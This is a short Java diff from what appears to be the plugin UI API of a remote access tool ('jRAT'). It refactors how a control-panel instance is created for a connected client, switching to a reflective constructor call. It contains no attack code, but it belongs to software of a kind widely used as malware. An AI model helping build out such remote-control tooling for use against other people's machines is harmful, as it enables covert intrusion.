@@ -1,5 +1,6 @@
 package jrat.api.ui;
 
+import java.lang.reflect.Constructor;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
@@ -74,15 +75,15 @@ public final class RATControlMenuEntry {
 
 	/**
 	 * 
-	 * @param server
-	 * @return Returns a new instance of the panel with the specified server as
-	 *         server
+	 * @param client
+	 * @return Returns a new instance of the panel with the specified client
 	 * @throws Exception
 	 */
-	public BaseControlPanel newPanelInstance(Client server) throws Exception {
-		BaseControlPanel p = panel.newInstance();
-		p.setClient(server);
-		return p;
+	public BaseControlPanel newPanelInstance(Client client) throws Exception {
+		Constructor<?> ctor = panel.getDeclaredConstructor(new Class[] { Client.class });
+		ctor.setAccessible(true);
+
+		return (BaseControlPanel) ctor.newInstance(client);
 	}
 
 }
